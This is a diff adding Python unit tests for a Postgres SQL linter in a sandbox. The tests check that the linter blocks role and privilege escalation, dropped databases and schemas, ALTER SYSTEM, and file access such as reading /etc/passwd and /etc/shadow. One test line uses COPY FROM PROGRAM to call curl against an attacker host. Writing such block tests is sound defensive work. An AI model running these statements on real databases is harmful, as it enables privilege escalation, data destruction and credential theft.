@@ -153,6 +153,62 @@ class SandboxLintTests(unittest.TestCase):
         engine.validate_sql_patch("CREATE INDEX idx_documents_title ON documents(title);")
         engine.validate_python_patch("def normalize(value):\n    return value or 0\n")
 
+    def test_sql_lint_blocks_role_and_privilege_escape_attempts(self):
+        store = build_postgres_store()
+        self.addCleanup(store.close)
+        engine = KernelEngine(store)
+
+        # 角色 / 授權切換 — 一旦放行，sandbox_runner 的權限隔離就失效
+        forbidden_role_escapes = [
+            "RESET ROLE;",
+            "SET ROLE postgres;",
+            "SET SESSION AUTHORIZATION postgres;",
+            "RESET SESSION AUTHORIZATION;",
+            "CREATE FUNCTION evil() RETURNS void LANGUAGE sql SECURITY DEFINER AS $$ SELECT 1 $$;",
+            "CREATE ROLE attacker;",
+            "ALTER ROLE sandbox_runner SUPERUSER;",
+            "DROP ROLE sandbox_runner;",
+            "CREATE USER attacker;",
+            "GRANT SELECT ON documents TO attacker;",
+            "REVOKE SELECT ON documents FROM sandbox_runner;",
+        ]
+        for sql in forbidden_role_escapes:
+            with self.assertRaisesRegex(SecurityError, "SQL Lint Blocked", msg=f"should block: {sql!r}"):
+                engine.validate_sql_patch(sql)
+
+    def test_sql_lint_blocks_schema_database_and_alter_system_destruction(self):
+        store = build_postgres_store()
+        self.addCleanup(store.close)
+        engine = KernelEngine(store)
+
+        forbidden_destruction = [
+            "DROP SCHEMA sandbox_temp_xxx CASCADE;",
+            "DROP DATABASE clk_test;",
+            "ALTER SYSTEM SET shared_buffers = '1MB';",
+        ]
+        for sql in forbidden_destruction:
+            with self.assertRaisesRegex(SecurityError, "SQL Lint Blocked", msg=f"should block: {sql!r}"):
+                engine.validate_sql_patch(sql)
+
+    def test_sql_lint_blocks_filesystem_and_copy_paths(self):
+        store = build_postgres_store()
+        self.addCleanup(store.close)
+        engine = KernelEngine(store)
+
+        forbidden_fs = [
+            "COPY documents FROM '/etc/passwd';",
+            "COPY documents TO '/tmp/leak.csv';",
+            "COPY documents FROM PROGRAM 'curl http://attacker/' WITH CSV;",
+            "SELECT pg_read_file('/etc/passwd');",
+            "SELECT pg_read_binary_file('/etc/shadow');",
+            "SELECT pg_ls_dir('/');",
+            "SELECT lo_import('/etc/passwd');",
+            "SELECT lo_export(123, '/tmp/leak');",
+        ]
+        for sql in forbidden_fs:
+            with self.assertRaisesRegex(SecurityError, "SQL Lint Blocked", msg=f"should block: {sql!r}"):
+                engine.validate_sql_patch(sql)
+
 
 if __name__ == "__main__":
     unittest.main()
